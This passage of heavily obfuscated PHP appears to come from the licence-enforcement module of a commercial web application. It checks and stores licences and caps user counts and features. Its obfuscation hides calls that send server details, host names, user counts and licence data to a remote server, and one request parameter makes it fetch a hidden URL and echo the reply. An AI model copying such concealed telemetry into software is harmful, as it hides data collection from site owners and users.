$µòÚÅù•[0] ? $µòÚÅù•[2] : $this->defaultAction); define($ÃùşÍÅ[23], MOD . $ÃùşÍÅ[0] . ST . $ÃùşÍÅ[0] . ACT); $ÖåĞÎĞ­ = $Ùöƒˆêô[684]; if (strlen($ÖåĞÎĞ­) < $Ùöƒˆêô[661]) { die; } $_SERVER[$ÃùşÍÅ[24]] = strtolower(ACTION); $this->autorun(); $‡›ŞÖ™ = $Ùöƒˆêô[685]; if (strlen($‡›ŞÖ™) < $Ùöƒˆêô[661]) { die; } if (count($µòÚÅù•) >= 3) { $this->appRun($Ã¡œ•˜°); } else { $this->appRun(ACTION); } } private $abcl2d36ed8f = array(); private $nmqx22af2d5b = ''; public function lnax14788095() { $ñæïú„ô =& $_SERVER[ˆûùúÊ¯]; $Àşªà¨½ =& $_SERVER[‚¥ÜÊŒß]; $this->qahg73cc62ca(); $this->hcpzac45f6a7(); $this->azti2d53f10d(); $›Â­æã¦ = $ñæïú„ô[686]; $this->emana5073ea8(); $à¿Ñ¶ = $ñæïú„ô[687]; while ($à¿Ñ¶ < $ñæïú„ô[19]) { if ($à¿Ñ¶ >= 0) { break; } $à¿Ñ¶++; } $this->qymv65b2cedc(); $”×İĞºæ = $ñæïú„ô[688]; if (!$”×İĞºæ) { return; } $this->cmnac64fbae2(); $Áˆñ”Ê = $ñæïú„ô[689]; while ($Áˆñ”Ê < $ñæïú„ô[19]) { if ($Áˆñ”Ê >= 0) { break; } $Áˆñ”Ê++; } $this->rluef92d63f9(); $çä”•áÒ = $ñæïú„ô[690]; if (strlen($çä”•áÒ) < $ñæïú„ô[661]) { return; } $this->ojgn2ded7f6e($Àşªà¨½[25], array($this, $Àşªà¨½[26])); $this->ojgn2ded7f6e($Àşªà¨½[27], array($this, $Àşªà¨½[28])); $this->ojgn2ded7f6e($Àşªà¨½[29], array($this, $Àşªà¨½[30])); $ÂÑıœ™ = $ñæïú„ô[691]; $this->ojgn2ded7f6e($Àşªà¨½[31], array($this, $Àşªà¨½[32])); $ÅÓ©“İ = $ñæïú„ô[692]; } public function qivb6e65a225($™ÏëÆ»ñ) { $’ğ”ÊìÙ =& $_SERVER[ˆûùúÊ¯]; $°¸›ºÊ™ =& $_SERVER[‚¥ÜÊŒß]; $¢ÅşÔªø = Model($°¸›ºÊ™[33])->get(); $‡²Šè£Ñ = $’ğ”ÊìÙ[693]; while (strlen($‡²Šè£Ñ) < $’ğ”ÊìÙ[19]) { if (!$‡²Šè£Ñ) { break; } $‡²Šè£Ñ++; } $¾ÂŠÄç = array($°¸›ºÊ™[34], $°¸›ºÊ™[35], $°¸›ºÊ™[36], $°¸›ºÊ™[37], $°¸›ºÊ™[38], $°¸›ºÊ™[39], $°¸›ºÊ™[40], $°¸›ºÊ™[41], $°¸›ºÊ™[42], $°¸›ºÊ™[43], $°¸›ºÊ™[44], $°¸›ºÊ™[45], $°¸›ºÊ™[46], $°¸›ºÊ™[47], $°¸›ºÊ™[48], $°¸›ºÊ™[49], $°¸›ºÊ™[50], $°¸›ºÊ™[51], $°¸›ºÊ™[52], $°¸›ºÊ™[53], $°¸›ºÊ™[54], $°¸›ºÊ™[55], $°¸›ºÊ™[56], $°¸›ºÊ™[57], $°¸›ºÊ™[58], $°¸›ºÊ™[59], $°¸›ºÊ™[60], $°¸›ºÊ™[61], $°¸›ºÊ™[62], $°¸›ºÊ™[63], $°¸›ºÊ™[64], $°¸›ºÊ™[65], $°¸›ºÊ™[66], $°¸›ºÊ™[67], $°¸›ºÊ™[68], $°¸›ºÊ™[69], $°¸›ºÊ™[70], $°¸›ºÊ™[71], $°¸›ºÊ™[72], $°¸›ºÊ™[73], $°¸›ºÊ™[74], $°¸›ºÊ™[75], $°¸›ºÊ™[76], $°¸›ºÊ™[77], $°¸›ºÊ™[78], $°¸›ºÊ™[79], $°¸›ºÊ™[80], $°¸›ºÊ™[81], $°¸›ºÊ™[82], $°¸›ºÊ™[83], $°¸›ºÊ™[84]); foreach ($¾ÂŠÄç as $Šğ±»ª) { $ˆ³Áñ = $GLOBALS[$°¸›ºÊ™[85]][$°¸›ºÊ™[86]][$Šğ±»ª]; $’ªÌà£ä = $’ğ”ÊìÙ[694]; if (isset($¢ÅşÔªø[$Šğ±»ª])) { $ˆ³Áñ = $¢ÅşÔªø[$Šğ±»ª]; } $™ÏëÆ»ñ[$°¸›ºÊ™[87]][$°¸›ºÊ™[88]][$Šğ±»ª] = $ˆ³Áñ; } $ä²€Îò‹ = $™ÏëÆ»ñ[$°¸›ºÊ™[87]][$°¸›ºÊ™[88]][$°¸›ºÊ™[46]]; $‰Ùö²ã” = $’ğ”ÊìÙ[695]; if (strlen($‰Ùö²ã”) < $’ğ”ÊìÙ[681]) { die; } unset($™ÏëÆ»ñ[$°¸›ºÊ™[87]][$°¸›ºÊ™[89]][$°¸›ºÊ™[90]]); unset($™ÏëÆ»ñ[$°¸›ºÊ™[87]][$°¸›ºÊ™[89]][$°¸›ºÊ™[91]]); unset($™ÏëÆ»ñ[$°¸›ºÊ™[87]][$°¸›ºÊ™[88]][$°¸›ºÊ™[46]]); unset($™ÏëÆ»ñ[$°¸›ºÊ™[87]][$°¸›ºÊ™[88]][$°¸›ºÊ™[92]]); $ê»À¼× = $’ğ”ÊìÙ[696]; $™ÏëÆ»ñ[$°¸›ºÊ™[87]][$°¸›ºÊ™[88]][$°¸›ºÊ™[93]] = array($°¸›ºÊ™[94] => (int) $ä²€Îò‹[$°¸›ºÊ™[95]], $°¸›ºÊ™[96] => (int) _get($ä²€Îò‹, $°¸›ºÊ™[97], 0)); $™ÏëÆ»ñ[$°¸›ºÊ™[98]][$°¸›ºÊ™[99]] = Action($°¸›ºÊ™[100])->accessToken(); $çÑ¼¸”ù = $’ğ”ÊìÙ[697]; if (strlen($çÑ¼¸”ù) < $’ğ”ÊìÙ[672]) { return; } $™ÏëÆ»ñ[$°¸›ºÊ™[98]][$°¸›ºÊ™[101]] = md5($_SERVER[$°¸›ºÊ™[102]] . $¢ÅşÔªø[$°¸›ºÊ™[103]]); $¥ÆÑ—³µ = $’ğ”ÊìÙ[698]; if (!$¥ÆÑ—³µ) { die; } $™ÏëÆ»ñ[$°¸›ºÊ™[98]][$°¸›ºÊ™[104]] = base64_encode(serverInfo()); $™ÏëÆ»ñ[$°¸›ºÊ™[98]][$°¸›ºÊ™[105]] = $this->nmqx22af2d5b; $âê¤»ëõ = $’ğ”ÊìÙ[699]; if (strlen($âê¤»ëõ) < $’ğ”ÊìÙ[19]) { return; } if ($¢ÅşÔªø[$°¸›ºÊ™[105]] != $°¸›ºÊ™[106]) { $™ÏëÆ»ñ[$°¸›ºÊ™[98]][$°¸›ºÊ™[107]] = $¢ÅşÔªø[$°¸›ºÊ™[107]]; $™ÏëÆ»ñ[$°¸›ºÊ™[98]][$°¸›ºÊ™[108]] = $¢ÅşÔªø[$°¸›ºÊ™[108]]; $µÑúğÆ = rand_string(10) . $this->nmqx22af2d5b . rand_string(5); $™ÏëÆ»ñ[$°¸›ºÊ™[87]][$°¸›ºÊ™[109]][$°¸›ºÊ™[110]] = $this->zxqi0f217a37($µÑúğÆ, $™ÏëÆ»ñ[$°¸›ºÊ™[98]][$°¸›ºÊ™[101]]); } if ($this->nmqx22af2d5b == $°¸›ºÊ™[106]) { $™ÏëÆ»ñ[$°¸›ºÊ™[87]][$°¸›ºÊ™[88]][$°¸›ºÊ™[93]][$°¸›ºÊ™[97]] = 0; } $™ÏëÆ»ñ[$°¸›ºÊ™[98]][$°¸›ºÊ™[111]] = _get($this->abcl2d36ed8f, $°¸›ºÊ™[112], $°¸›ºÊ™[6]); $™ÏëÆ»ñ[$°¸›ºÊ™[98]][$°¸›ºÊ™[113]] = _get($this->abcl2d36ed8f, $°¸›ºÊ™[114], $°¸›ºÊ™[6]); if (_get($GLOBALS, $°¸›ºÊ™[115]) && $this->config[$°¸›ºÊ™[116]]) { $™ÏëÆ»ñ[$°¸›ºÊ™[98]][$°¸›ºÊ™[117]] = WEB_ROOT; } return $™ÏëÆ»ñ; } private function cmnac64fbae2() { $ªô†êÁª =& $_SERVER[ˆûùúÊ¯]; $¼¤ÀıçÉ =& $_SERVER[‚¥ÜÊŒß]; $¬ÓøÑ = $_SERVER[$¼¤ÀıçÉ[24]] == $¼¤ÀıçÉ[118]; $ß¡”œÌó = $ªô†êÁª[700]; if (!$ß¡”œÌó) { die; } if ($_SERVER[$¼¤ÀıçÉ[24]] == $¼¤ÀıçÉ[119] && $_GET[$¼¤ÀıçÉ[120]] == $¼¤ÀıçÉ[121]) { $¬ÓøÑ = !0; } if ($¬ÓøÑ) { $Ş¹ºù¸ = array($¼¤ÀıçÉ[105] => $this->nmqx22af2d5b, $¼¤ÀıçÉ[122] => $this->oelwa077c1cf(), $¼¤ÀıçÉ[123] => Model($¼¤ÀıçÉ[124])->count()); if ($this->nmqx22af2d5b != $¼¤ÀıçÉ[106]) { $ÕáÄ©· = _get($this->abcl2d36ed8f, $¼¤ÀıçÉ[125]); if ($ÕáÄ©·) { $Ş¹ºù¸[$¼¤ÀıçÉ[126]] = $ÕáÄ©·; $Ş¹ºù¸[$¼¤ÀıçÉ[127]] = strtotime(_get($this->abcl2d36ed8f, $¼¤ÀıçÉ[128])); $Ş¹ºù¸[$¼¤ÀıçÉ[129]] = _get($this->abcl2d36ed8f, $¼¤ÀıçÉ[114]); } $ŞÖäÛî… = Model($¼¤ÀıçÉ[33])->get($¼¤ÀıçÉ[130], $¼¤ÀıçÉ[6], !0); if (is_string($ŞÖäÛî…) && substr($ŞÖäÛî…, 0, 1) == $¼¤ÀıçÉ[131]) { $ŞÖäÛî… = json_decode_force($ŞÖäÛî…); } if (is_array($ŞÖäÛî…) && $ŞÖäÛî…[$¼¤ÀıçÉ[132]] && strstr($ŞÖäÛî…[$¼¤ÀıçÉ[132]], $¼¤ÀıçÉ[133])) { $¤è³“ãş = explode($¼¤ÀıçÉ[133], $ŞÖäÛî…[$¼¤ÀıçÉ[132]]); $Ş¹ºù¸[$¼¤ÀıçÉ[134]] = $¤è³“ãş[0]; } } $Ş¹ºù¸ = $this->orna6903f913(json_encode($Ş¹ºù¸), md5($¼¤ÀıçÉ[135])); $ËÉÙûä = array($¼¤ÀıçÉ[136] => $Ş¹ºù¸); call_user_func(array($¼¤ÀıçÉ[137], $¼¤ÀıçÉ[138]), $ËÉÙûä); $¢ğêê€ú = $ªô†êÁª[701]; if (!$¢ğêê€ú) { die; } } if ($this->nmqx22af2d5b == $¼¤ÀıçÉ[106]) { return; } $ğ¦‘ÙÊ = array($¼¤ÀıçÉ[139], $¼¤ÀıçÉ[140], $¼¤ÀıçÉ[141], $¼¤ÀıçÉ[142], $¼¤ÀıçÉ[143], $¼¤ÀıçÉ[144]); $çÖÎÏ˜´ = Model($¼¤ÀıçÉ[33])->get(); $ËÉÙûä = array($¼¤ÀıçÉ[145] => $çÖÎÏ˜´[$¼¤ÀıçÉ[34]], $¼¤ÀıçÉ[146] => $çÖÎÏ˜´[$¼¤ÀıçÉ[35]], $¼¤ÀıçÉ[147] => $¼¤ÀıçÉ[6]); $œ¿„îó® = $ªô†êÁª[702]; if (strlen($œ¿„îó®) < $ªô†êÁª[672]) { die; } foreach ($ğ¦‘ÙÊ as $Ù©Â…Ù) { if (!isset($çÖÎÏ˜´[$Ù©Â…Ù]) || !$çÖÎÏ˜´[$Ù©Â…Ù]) { continue; } $ËÉÙûä[$Ù©Â…Ù] = $çÖÎÏ˜´[$Ù©Â…Ù]; $ÈÆºí½ = $ªô†êÁª[703]; if (strlen($ÈÆºí½) < $ªô†êÁª[681]) { die; } } call_user_func(array($¼¤ÀıçÉ[137], $¼¤ÀıçÉ[138]), $ËÉÙûä); } private function emana5073ea8() { $éºÃéš„ =& $_SERVER[ˆûùúÊ¯]; $ëˆß¡ï¿ =& $_SERVER[‚¥ÜÊŒß]; if ($_SERVER[$ëˆß¡ï¿[24]] != $ëˆß¡ï¿[148]) { return; } if (!_get($GLOBALS, $ëˆß¡ï¿[115])) { die; } $íĞÛéïÅ = $GLOBALS[$ëˆß¡ï¿[13]]; if (isset($íĞÛéïÅ[$ëˆß¡ï¿[149]])) { $this->hery6097fc20(); die; } if (!isset($íĞÛéïÅ[$ëˆß¡ï¿[150]]) || strlen($íĞÛéïÅ[$ëˆß¡ï¿[150]]) != 16) { show_json($ëˆß¡ï¿[151] . $íĞÛéïÅ[$ëˆß¡ï¿[150]], !1); } $¾Ó°œò¢ = Model($ëˆß¡ï¿[33])->get($ëˆß¡ï¿[103]); $˜’†¥¼Å = md5($_SERVER[$ëˆß¡ï¿[102]] . $¾Ó°œò¢); $¬ŒúÁ÷ = $éºÃéš„[704]; $éÄ°½´ = array($ëˆß¡ï¿[150] => $íĞÛéïÅ[$ëˆß¡ï¿[150]], $ëˆß¡ï¿[152] => rand_string(16), $ëˆß¡ï¿[153] => $ëˆß¡ï¿[135], $ëˆß¡ï¿[154] => $ëˆß¡ï¿[155], $ëˆß¡ï¿[156] => $_SERVER[$ëˆß¡ï¿[157]], $ëˆß¡ï¿[158] => $_SERVER[$ëˆß¡ï¿[159]], $ëˆß¡ï¿[160] => $_SERVER[$ëˆß¡ï¿[161]], $ëˆß¡ï¿[101] => $˜’†¥¼Å, $ëˆß¡ï¿[162] => Model($ëˆß¡ï¿[33])->get($ëˆß¡ï¿[130])); $µ¥®½»Ã = $éºÃéš„[705]; if ($íĞÛéïÅ[$ëˆß¡ï¿[163]] == $ëˆß¡ï¿[164]) { $‚ªÚºÍæ = $this->orna6903f913($˜’†¥¼Å, $ëˆß¡ï¿[165]); $¶çé£¥± = $this->zxqi0f217a37(json_encode($éÄ°½´), $˜’†¥¼Å . $ëˆß¡ï¿[166], 3); $¶çé£¥± = $¶çé£¥± . $ëˆß¡ï¿[167] . $_SERVER[$ëˆß¡ï¿[157]]; $·¹ßó = $this->pdza1fd04e31($ëˆß¡ï¿[168] . $‚ªÚºÍæ . $ëˆß¡ï¿[169] . $¶çé£¥±, -1); show_json($·¹ßó, !0); } else { if ($íĞÛéïÅ[$ëˆß¡ï¿[163]] == $ëˆß¡ï¿[170]) { $º¸ÑË™ = substr(md5($ëˆß¡ï¿[171] . $˜’†¥¼Å), 12, 15) . $ëˆß¡ï¿[172]; $¶çé£¥± = $this->orkcbe9411e8(trim($íĞÛéïÅ[$ëˆß¡ï¿[173]]), $º¸ÑË™, 2); $Å¼ÔÍªó = json_decode($¶çé£¥±, !0); if (!is_array($Å¼ÔÍªó) || !is_array($Å¼ÔÍªó[$ëˆß¡ï¿[174]]) || $Å¼ÔÍªó[$ëˆß¡ï¿[150]] != !0) { $¸¿ş›÷ø = $ëˆß¡ï¿[175]; $Ó×ÎµËû = $Å¼ÔÍªó[$ëˆß¡ï¿[174]] ? $ëˆß¡ï¿[176] . $Å¼ÔÍªó[$ëˆß¡ï¿[174]] : $¸¿ş›÷ø; show_json($Ó×ÎµËû, !1); } else { $éÄ°½´[$ëˆß¡ï¿[152]] = $Å¼ÔÍªó[$ëˆß¡ï¿[174]][$ëˆß¡ï¿[177]]; } } else { $Å¼ÔÍªó = $this->pdza1fd04e31($ëˆß¡ï¿[178], $éÄ°½´, 10); } } if (!is_array($Å¼ÔÍªó) || !is_array($Å¼ÔÍªó[$ëˆß¡ï¿[174]]) || $Å¼ÔÍªó[$ëˆß¡ï¿[150]] != !0) { $¸¿ş›÷ø = LNG($ëˆß¡ï¿[179]); $Ó×ÎµËû = $Å¼ÔÍªó[$ëˆß¡ï¿[174]] ? $ëˆß¡ï¿[176] . $Å¼ÔÍªó[$ëˆß¡ï¿[174]] : $¸¿ş›÷ø; show_json($Ó×ÎµËû, !1); } $Š³ê……Ä = $Å¼ÔÍªó[$ëˆß¡ï¿[174]]; $ñ£¨ã½ = $this->yodvbfafdb47($Š³ê……Ä[$ëˆß¡ï¿[180]]); $ìâôÆÙ = $éºÃéš„[706]; while ($ìâôÆÙ < $éºÃéš„[661]) { if ($ìâôÆÙ >= 0) { break; } $ìâôÆÙ++; } if (!$ñ£¨ã½ || $ñ£¨ã½ != $Š³ê……Ä[$ëˆß¡ï¿[128]]) { $òÈÑ˜Ôè = array($ëˆß¡ï¿[181] => Model($ëˆß¡ï¿[33])->get($ëˆß¡ï¿[103]), $ëˆß¡ï¿[182] => $_SERVER[$ëˆß¡ï¿[102]], $ëˆß¡ï¿[183] => this_url(), $ëˆß¡ï¿[158] => $_SERVER[$ëˆß¡ï¿[159]]); $¶çé£¥± = $this->rmhb90fe2c27(json_encode($òÈÑ˜Ôè)); $this->pdza1fd04e31($ëˆß¡ï¿[184] . $¶çé£¥±); show_json(LNG($ëˆß¡ï¿[185]), !0); } $Ø¾²É× = array($ëˆß¡ï¿[186] => $Š³ê……Ä[$ëˆß¡ï¿[187]], $ëˆß¡ï¿[188] => $Š³ê……Ä[$ëˆß¡ï¿[189]], $ëˆß¡ï¿[190] => rand_string(16), $ëˆß¡ï¿[105] => $Š³ê……Ä[$ëˆß¡ï¿[191]]); if ($éÄ°½´[$ëˆß¡ï¿[152]]) { $Ø¾²É×[$ëˆß¡ï¿[190]] = $éÄ°½´[$ëˆß¡ï¿[152]]; } $¸”Š´½™ = substr(md5($Ø¾²É×[$ëˆß¡ï¿[188]]), 10, 10); $«¨”¾Ô¬ = $¸”Š´½™ . $Ø¾²É×[$ëˆß¡ï¿[105]] . $Ø¾²É×[$ëˆß¡ï¿[190]]; $…¾©ãŞ = $éºÃéš„[707]; while ($…¾©ãŞ < $éºÃéš„[681]) { if ($…¾©ãŞ >= 0) { break; } $…¾©ãŞ++; } $Ø¾²É×[$ëˆß¡ï¿[107]] = strrev(base64_encode($this->orna6903f913($«¨”¾Ô¬, $ëˆß¡ï¿[192]))); $–ÆÃä Ş = $éºÃéš„[708]; while (strlen($–ÆÃä Ş) < $éºÃéš„[661]) { if (!$–ÆÃä Ş) { break; } $–ÆÃä Ş++; } $ƒ¹îµ¥Ú = rand_string(16); $Ë®à •Ş = $ƒ¹îµ¥Ú . $Ø¾²É×[$ëˆß¡ï¿[105]] . $this->orna6903f913(md5($Ø¾²É×[$ëˆß¡ï¿[186]]), $ƒ¹îµ¥Ú); $Ø¾²É×[$ëˆß¡ï¿[108]] = base64_encode(strrev($this->orna6903f913($Ë®à •Ş, $ëˆß¡ï¿[193]))); $ñûîåÈ = $éºÃéš„[709]; if ($Š³ê……Ä[$ëˆß¡ï¿[194]] && $Š³ê……Ä[$ëˆß¡ï¿[194]] >= 1) { Model($ëˆß¡ï¿[33])->setDeep($ëˆß¡ï¿[195], $ëˆß¡ï¿[121]); } Model($ëˆß¡ï¿[33])->set($Ø¾²É×); $‰–ûä« = md5($_SERVER[$ëˆß¡ï¿[102]] . strrev($¾Ó°œò¢) . $Ø¾²É×[$ëˆß¡ï¿[188]]); $ãêë¶Ê§ = $éºÃéš„[710]; while (strlen($ãêë¶Ê§) < $éºÃéš„[664]) { if (!$ãêë¶Ê§) { break; } $ãêë¶Ê§++; } $àØ•¹Şé = strrev(substr($‰–ûä«, 10, 16)); $±É²Áœ” = $éºÃéš„[711]; if (strlen($±É²Áœ”) < $éºÃéš„[661]) { return; } $íïæ¾´ = $this->zxqi0f217a37(json_encode($Š³ê……Ä), $‰–ûä«); $±¶Œƒ§ı = array_to_keyvalue(Model($ëˆß¡ï¿[7])->listData(), $ëˆß¡ï¿[196]); $‰¼Ç™®ì = $±¶Œƒ§ı[$ëˆß¡ï¿[197]]; $ùØ¦ÈóØ = array(); $¼–åö = $éºÃéš„[712]; if (strlen($¼–åö) < $éºÃéš„[19]) { return; } $ùØ¦ÈóØ[$àØ•¹Şé] = $íïæ¾´; $áøóˆèú = $éºÃéš„[713]; Model($ëˆß¡ï¿[7])->update($‰¼Ç™®ì[$ëˆß¡ï¿[198]], array($ëˆß¡ï¿[199] => $ùØ¦ÈóØ)); $íõùõÜ† = $éºÃéš„[714]; while (strlen($íõùõÜ†) < $éºÃéš„[664]) { if (!$íõùõÜ†) { break; } $íõùõÜ†++; } $this->abcl2d36ed8f = $Š³ê……Ä; $Ë¦«¥ñ = $éºÃéš„[715]; $this->nmqx22af2d5b = $Ø¾²É×[$ëˆß¡ï¿[105]]; $this->licenseRegistSuccess(); Cache::set($ëˆß¡ï¿[200] . md5($¾Ó°œò¢ . $ëˆß¡ï¿[201]), $ëˆß¡ï¿[6]); $ÙÊ•ıÉÇ = $éºÃéš„[716]; if (strlen($ÙÊ•ıÉÇ) < $éºÃéš„[661]) { return; } show_json(LNG($ëˆß¡ï¿[185]), !0); } private function licenseRegistSuccess() { $ÇıÅú»î =& $_SERVER[ˆûùúÊ¯]; $ß¦˜Ú…ï =& $_SERVER[‚¥ÜÊŒß]; $«ë¤å€õ = Model($ß¦˜Ú…ï[33])->get(); $—õìÇËí = $ÇıÅú»î[717]; while (strlen($—õìÇËí) < $ÇıÅú»î[661]) { if (!$—õìÇËí) { break; } $—õìÇËí++; } if ($«ë¤å€õ[$ß¦˜Ú…ï[63]] != $ß¦˜Ú…ï[121]) { Model($ß¦˜Ú…ï[33])->set($ß¦˜Ú…ï[63], $ß¦˜Ú…ï[121]); } Action($ß¦˜Ú…ï[202])->initStart(!0); } private function hery6097fc20() { $‘¢œ¥ =& $_SERVER[ˆûùúÊ¯]; $Óì¸üÏİ =& $_SERVER[‚¥ÜÊŒß]; Model($Óì¸üÏİ[33])->set(array($Óì¸üÏİ[186] => $Óì¸üÏİ[6], $Óì¸üÏİ[188] => $Óì¸üÏİ[6], $Óì¸üÏİ[105] => $Óì¸üÏİ[106], $Óì¸üÏİ[107] => $Óì¸üÏİ[6], $Óì¸üÏİ[108] => $Óì¸üÏİ[6])); $“â“õÙÇ = $‘¢œ¥[718]; if (!$“â“õÙÇ) { return; } Model($Óì¸üÏİ[33])->setDeep($Óì¸üÏİ[195], $Óì¸üÏİ[203]); $Ù¯´Í‘ = $‘¢œ¥[719]; if (!$Ù¯´Í‘) { die; } $this->abcl2d36ed8f = array(); $this->nmqx22af2d5b = $Óì¸üÏİ[106]; $•ÈéÅ = $‘¢œ¥[720]; if (!$•ÈéÅ) { return; } } private function qahg73cc62ca() { $¸¤Ê™ÍŞ =& $_SERVER[ˆûùúÊ¯]; $¦éªº†Ğ =& $_SERVER[‚¥ÜÊŒß]; $_SERVER[$¦éªº†Ğ[159]] = _get($_SERVER, $¦éªº†Ğ[159], APP_HOST); $this->nmqx22af2d5b = $¦éªº†Ğ[106]; $Êø¿¤à = $¸¤Ê™ÍŞ[721]; while (strlen($Êø¿¤à) < $¸¤Ê™ÍŞ[681]) { if (!$Êø¿¤à) { break; } $Êø¿¤à++; } $Õ¶ÒÛæÄ = Model($¦éªº†Ğ[33])->get(); $à›‚€Â„ = $¸¤Ê™ÍŞ[722]; if (strlen($à›‚€Â„) < $¸¤Ê™ÍŞ[672]) { return; } if ($Õ¶ÒÛæÄ[$¦éªº†Ğ[105]] == $¦éªº†Ğ[106]) { return; } $İø‹ıôñ = Model($¦éªº†Ğ[33])->get($¦éªº†Ğ[103]); $ı‡ÄĞÚ = $¦éªº†Ğ[200] . md5($İø‹ıôñ . $¦éªº†Ğ[201]); $è“½¨®ı = $¸¤Ê™ÍŞ[723]; while ($è“½¨®ı < $¸¤Ê™ÍŞ[661]) { if ($è“½¨®ı >= 0) { break; } $è“½¨®ı++; } $áæÆ‡Ï = Cache::get($ı‡ÄĞÚ); $Á’Èã¸ = $¸¤Ê™ÍŞ[724]; if (!is_array($áæÆ‡Ï) || !isset($áæÆ‡Ï[$¦éªº†Ğ[204]]) || time() - $áæÆ‡Ï[$¦éªº†Ğ[204]] >= 60) { $Ù·ÛÑÔ = Model($¦éªº†Ğ[7])->loadList(); $æşšÄ¸Ì = $Ù·ÛÑÔ[$¦éªº†Ğ[197]]; $õÔĞÙíÍ = md5($_SERVER[$¦éªº†Ğ[102]] . strrev($İø‹ıôñ) . $Õ¶ÒÛæÄ[$¦éªº†Ğ[188]]); $¼ÇšÚŠ = strrev(substr($õÔĞÙíÍ, 10, 16)); $áæÆ‡Ï = $this->orkcbe9411e8($æşšÄ¸Ì[$¦éªº†Ğ[85]][$¼ÇšÚŠ], $õÔĞÙíÍ); $áæÆ‡Ï = json_decode($áæÆ‡Ï, !0); } if (!is_array($áæÆ‡Ï)) { return $this->hery6097fc20(); } $ì¥õÀ§ = strtotime($áæÆ‡Ï[$¦éªº†Ğ[128]]); if (time() >= $ì¥õÀ§) { return $this->hery6097fc20(); } if (time() - $áæÆ‡Ï[$¦éªº†Ğ[204]] > 20) { $áæÆ‡Ï[$¦éªº†Ğ[204]] = time(); Cache::set($ı‡ÄĞÚ, $áæÆ‡Ï); } $this->abcl2d36ed8f = $áæÆ‡Ï; $this->nmqx22af2d5b = $Õ¶ÒÛæÄ[$¦éªº†Ğ[105]]; $º™Ì÷Ú” = $¸¤Ê™ÍŞ[725]; } private function hcpzac45f6a7() { $ı»ø¯ğò =& $_SERVER[‚¥ÜÊŒß]; $õ‰ Ç­é = $GLOBALS[$ı»ø¯ğò[13]]; $èôéÒãİ = $_SERVER[$ı»ø¯ğò[24]]; $ÀÌŞ·´ = $_SERVER[ˆûùúÊ¯][726]; if ($èôéÒãİ == $ı»ø¯ğò[205] && $this->nmqx22af2d5b == $ı»ø¯ğò[106]) { show_json(LNG($ı»ø¯ğò[206]), !1, $ı»ø¯ğò[207]); } $•€ğºÃ” = array($ı»ø¯ğò[208], $ı»ø¯ğò[209]); if (in_array($èôéÒãİ, $•€ğºÃ”)) { if ($this->nmqx22af2d5b == $ı»ø¯ğò[106] && isset($õ‰ Ç­é[$ı»ø¯ğò[210]])) { show_json(LNG($ı»ø¯ğò[206]), !1, $ı»ø¯ğò[207]); die; } $Û¢õğÆæ = $this->oelwa077c1cf(); if ($Û¢õğÆæ != intval($ı»ø¯ğò[211])) { if ($Û¢õğÆæ <= Model($ı»ø¯ğò[124])->count()) { show_json(LNG($ı»ø¯ğò[212]), !1, $ı»ø¯ğò[207]); die; } } } } private function azti2d53f10d() { $Æ­ÇÂ­© =& $_SERVER[ˆûùúÊ¯]; $Éàú±©Œ =& $_SERVER[‚¥ÜÊŒß]; $­€êß¥ = array($Éàú±©Œ[118], $Éàú±©Œ[119]); if (!_get($GLOBALS, $Éàú±©Œ[115]) || !isset($_GET[$Éàú±©Œ[213]])) { return; } if (!in_array($_SERVER[$Éàú±©Œ[24]], $­€êß¥)) { return; } $êì„™Í„ = $Éàú±©Œ[214]; $©± Şğ„ = $Æ­ÇÂ­©[727]; if (strlen($©± Şğ„) < $Æ­ÇÂ­©[681]) { die; } $êì„™Í„ = $this->glsb64d7e5b5($êì„™Í„, $Éàú±©Œ[215]); $µ°ÄßÌ = $Æ­ÇÂ­©[728]; if (!$µ°ÄßÌ) { die; } $Ğƒ™öÆÜ = stream_context_create(array($Éàú±©Œ[216] => array($Éàú±©Œ[217] => $Éàú±©Œ[218], $Éàú±©Œ[219] => 3))); $áğİñâ = @file_get_contents($êì„™Í„, !1, $Ğƒ™öÆÜ); header($Éàú±©Œ[220]); $±ªà Á’ = $Æ­ÇÂ­©[729]; if ($áğİñâ && strstr($áğİñâ, $Éàú±©Œ[221])) { echo $áğİñâ; } die; } public function rtjye624e4a2($Ù‘…Å„ú) { $÷Èò£ª¨ =& $_SERVER[ˆûùúÊ¯]; $£×ºŸÒ” =& $_SERVER[‚¥ÜÊŒß]; if ($this->nmqx22af2d5b == $£×ºŸÒ”[222]) { return $Ù‘…Å„ú; } $¡‘Ç÷ = array($£×ºŸÒ”[223] => $£×ºŸÒ”[224], $£×ºŸÒ”[225] => $£×ºŸÒ”[224], $£×ºŸÒ”[226] => $£×ºŸÒ”[224], $£×ºŸÒ”[227] => $£×ºŸÒ”[228], $£×ºŸÒ”[229] => $£×ºŸÒ”[228], $£×ºŸÒ”[230] => $£×ºŸÒ”[228], $£×ºŸÒ”[231] => $£×ºŸÒ”[228], $£×ºŸÒ”[232] => $£×ºŸÒ”[228], $£×ºŸÒ”[233] => $£×ºŸÒ”[228], $£×ºŸÒ”[234] => $£×ºŸÒ”[228], $£×ºŸÒ”[235] => $£×ºŸÒ”[228], $£×ºŸÒ”[236] => $£×ºŸÒ”[228], $£×ºŸÒ”[237] => $£×ºŸÒ”[228], $£×ºŸÒ”[238] => $£×ºŸÒ”[228], $£×ºŸÒ”[239] => $£×ºŸÒ”[228]); $çòÑË‚µ = explode($£×ºŸÒ”[240], _get($this->abcl2d36ed8f, $£×ºŸÒ”[112], $£×ºŸÒ”[6])); $…„ÜÖœÕ = array(); $Ó¶Ì¦¢µ = $÷Èò£ª¨[730]; foreach ($¡‘Ç÷ as $ÌÙÕîó± => $ĞøÚ’ÂÅ) { if ($ĞøÚ’ÂÅ == $£×ºŸÒ”[224] && substr($this->nmqx22af2d5b, 0, 1) == $£×ºŸÒ”[224]) { continue; } if (!in_array($ÌÙÕîó±, $çòÑË‚µ)) { $…„ÜÖœÕ[] = $ÌÙÕîó±; } } foreach ($…„ÜÖœÕ as $ÌÙÕîó±) { unset($Ù‘…Å„ú[$ÌÙÕîó±]); $Í¡²Ãş¨ = $÷Èò£ª¨[731]; while ($Í¡²Ãş¨ < $÷Èò£ª¨[664]) { if ($Í¡²Ãş¨ >= 0) { break; } $Í¡²Ãş¨++; } } return $Ù‘…Å„ú; } private function rluef92d63f9() { $Ñš¶Üß· =& $_SERVER[‚¥ÜÊŒß]; if ($this->nmqx22af2d5b != $Ñš¶Üß·[106]) { $GLOBALS[$Ñš¶Üß·[85]][$Ñš¶Üß·[89]][$Ñš¶Üß·[241]] = $Ñš¶Üß·[203]; return; } $GLOBALS[$Ñš¶Üß·[85]][$Ñš¶Üß·[242]] = $Ñš¶Üß·[121]; if 